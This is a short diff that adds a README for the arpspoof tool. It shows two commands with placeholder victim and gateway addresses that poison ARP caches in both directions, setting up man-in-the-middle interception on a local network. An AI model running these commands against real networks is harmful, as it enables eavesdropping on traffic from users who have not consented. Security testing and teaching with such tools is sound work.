@@ -1,0 +1,10 @@
+README arpspoof
+
+    NOTES
+
+    Basic spoofing usage:
+
+    arpspoof -i ${IFACE} -t ${VICTIM_IP} ${GW_IP} &
+    arpspoof -i ${IFACE} -t ${GW_IP} ${VICTIM_IP} &
+
+End of file.
